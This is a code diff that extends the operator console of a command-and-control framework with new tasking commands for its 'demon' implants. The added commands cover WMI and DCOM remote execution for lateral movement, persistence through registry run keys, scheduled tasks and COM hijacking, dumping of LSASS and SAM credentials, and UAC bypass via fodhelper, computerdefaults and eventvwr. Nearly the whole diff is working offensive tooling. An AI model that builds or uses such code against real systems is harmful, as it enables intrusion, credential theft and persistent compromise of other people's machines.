@@ -2355,6 +2355,154 @@ auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& c
 
             SEND( Execute.Ptt( TaskID, Ticket, Luid ) );
         }
+        else if ( InputCommands[ 0 ].compare( "wmi" ) == 0 )
+        {
+            if ( InputCommands.size() < 4 || InputCommands[ 1 ].compare( "exec" ) != 0 )
+            {
+                CONSOLE_ERROR( "Usage: wmi exec <target> <command>" )
+                return false;
+            }
+            auto Target = InputCommands[ 2 ];
+            auto Cmd    = InputCommands[ 3 ];
+            TaskID                     = CONSOLE_INFO( "Tasked demon to run command via WMI on " + Target );
+            CommandInputList[ TaskID ] = commandline;
+            SEND( Execute.Lateral( TaskID, "wmi", Target, Cmd, "" ) )
+        }
+        else if ( InputCommands[ 0 ].compare( "dcom" ) == 0 )
+        {
+            if ( InputCommands.size() < 4 || InputCommands[ 1 ].compare( "exec" ) != 0 )
+            {
+                CONSOLE_ERROR( "Usage: dcom exec <target> <command> [/method mmc20|shellwindows]" )
+                return false;
+            }
+            auto Target = InputCommands[ 2 ];
+            auto Cmd    = InputCommands[ 3 ];
+            auto Method = QString( "mmc20" );
+            for ( int i = 4; i + 1 < InputCommands.size(); i++ )
+            {
+                if ( InputCommands[ i ].compare( "/method" ) == 0 )
+                    Method = InputCommands[ i + 1 ];
+            }
+            TaskID                     = CONSOLE_INFO( "Tasked demon to run command via DCOM on " + Target );
+            CommandInputList[ TaskID ] = commandline;
+            SEND( Execute.Lateral( TaskID, "dcom", Target, Cmd, Method ) )
+        }
+        else if ( InputCommands[ 0 ].compare( "persist" ) == 0 )
+        {
+            if ( InputCommands.size() < 2 )
+            {
+                CONSOLE_ERROR( "Usage: persist reg|schtask|com|remove ..." )
+                return false;
+            }
+            auto Sub = InputCommands[ 1 ];
+            auto Params = QMap<std::string,std::string>();
+            if ( Sub.compare( "reg" ) == 0 )
+            {
+                if ( InputCommands.size() < 4 )
+                {
+                    CONSOLE_ERROR( "Usage: persist reg <name> <value> [/system]" )
+                    return false;
+                }
+                Params[ "Name" ]  = InputCommands[ 2 ].toStdString();
+                Params[ "Value" ] = InputCommands[ 3 ].toStdString();
+                Params[ "Hive" ]  = "user";
+                for ( int i = 4; i < InputCommands.size(); i++ )
+                {
+                    if ( InputCommands[ i ].compare( "/system" ) == 0 )
+                        Params[ "Hive" ] = "system";
+                }
+                TaskID = CONSOLE_INFO( "Tasked demon to add registry run-key: " + InputCommands[ 2 ] );
+            }
+            else if ( Sub.compare( "schtask" ) == 0 )
+            {
+                if ( InputCommands.size() < 5 )
+                {
+                    CONSOLE_ERROR( "Usage: persist schtask <name> <command> <trigger>" )
+                    return false;
+                }
+                Params[ "TaskName" ] = InputCommands[ 2 ].toStdString();
+                Params[ "Cmd" ]      = InputCommands[ 3 ].toStdString();
+                Params[ "Trigger" ]  = InputCommands[ 4 ].toStdString();
+                TaskID = CONSOLE_INFO( "Tasked demon to create scheduled task: " + InputCommands[ 2 ] );
+            }
+            else if ( Sub.compare( "com" ) == 0 )
+            {
+                if ( InputCommands.size() < 4 )
+                {
+                    CONSOLE_ERROR( "Usage: persist com <clsid> <dll_path>" )
+                    return false;
+                }
+                Params[ "CLSID" ]   = InputCommands[ 2 ].toStdString();
+                Params[ "DllPath" ] = InputCommands[ 3 ].toStdString();
+                TaskID = CONSOLE_INFO( "Tasked demon to hijack COM CLSID: " + InputCommands[ 2 ] );
+            }
+            else if ( Sub.compare( "remove" ) == 0 )
+            {
+                if ( InputCommands.size() < 4 )
+                {
+                    CONSOLE_ERROR( "Usage: persist remove reg|schtask|com <name>" )
+                    return false;
+                }
+                Params[ "RemoveType" ] = InputCommands[ 2 ].toStdString();
+                Params[ "Name" ]       = InputCommands[ 3 ].toStdString();
+                TaskID = CONSOLE_INFO( "Tasked demon to remove persistence: " + InputCommands[ 2 ] + " " + InputCommands[ 3 ] );
+            }
+            else
+            {
+                CONSOLE_ERROR( "Unknown persist sub-command: " + Sub )
+                return false;
+            }
+            CommandInputList[ TaskID ] = commandline;
+            SEND( Execute.Persist( TaskID, Sub, Params ) )
+        }
+        else if ( InputCommands[ 0 ].compare( "creds" ) == 0 )
+        {
+            if ( InputCommands.size() < 2 )
+            {
+                CONSOLE_ERROR( "Usage: creds lsass [/filename <path>] | creds sam" )
+                return false;
+            }
+            auto Sub      = InputCommands[ 1 ];
+            auto Filename = QString();
+            if ( Sub.compare( "lsass" ) == 0 )
+            {
+                for ( int i = 2; i + 1 < InputCommands.size(); i++ )
+                {
+                    if ( InputCommands[ i ].compare( "/filename" ) == 0 )
+                        Filename = InputCommands[ i + 1 ];
+                }
+                TaskID = CONSOLE_INFO( "Tasked demon to dump lsass" );
+            }
+            else if ( Sub.compare( "sam" ) == 0 )
+            {
+                TaskID = CONSOLE_INFO( "Tasked demon to dump SAM hives" );
+            }
+            else
+            {
+                CONSOLE_ERROR( "Unknown creds sub-command: " + Sub )
+                return false;
+            }
+            CommandInputList[ TaskID ] = commandline;
+            SEND( Execute.Creds( TaskID, Sub, Filename ) )
+        }
+        else if ( InputCommands[ 0 ].compare( "privesc" ) == 0 )
+        {
+            if ( InputCommands.size() < 2 || InputCommands[ 1 ].compare( "uac" ) != 0 )
+            {
+                CONSOLE_ERROR( "Usage: privesc uac <method> <command>  (method: fodhelper|computerdefaults|eventvwr)" )
+                return false;
+            }
+            if ( InputCommands.size() < 4 )
+            {
+                CONSOLE_ERROR( "Usage: privesc uac <method> <command>" )
+                return false;
+            }
+            auto Method = InputCommands[ 2 ];
+            auto Cmd    = InputCommands[ 3 ];
+            TaskID                     = CONSOLE_INFO( "Tasked demon to bypass UAC via " + Method );
+            CommandInputList[ TaskID ] = commandline;
+            SEND( Execute.Privesc( TaskID, "uac", Method, Cmd ) )
+        }
         else if ( InputCommands[ 0 ].compare( "exit" ) == 0 )
         {
             if ( InputCommands.length() < 2 )
